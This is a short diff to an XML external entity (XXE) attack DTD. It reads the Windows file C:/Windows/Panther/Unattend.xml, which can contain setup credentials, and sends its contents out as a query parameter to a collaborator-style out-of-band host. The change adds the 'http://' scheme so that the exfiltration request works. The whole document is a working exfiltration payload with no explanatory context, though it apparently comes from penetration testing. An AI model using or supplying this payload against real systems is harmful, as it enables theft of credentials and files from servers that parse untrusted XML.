@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/Panther/Unattend.xml">
-<!ENTITY % all "<!ENTITY send SYSTEM 'sqmxsnew1wxjs1941b5oxrso1f76vv.cigitalcollaborator.com/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://sqmxsnew1wxjs1941b5oxrso1f76vv.cigitalcollaborator.com/?collect=%file;'>">
 %all;
 %send;
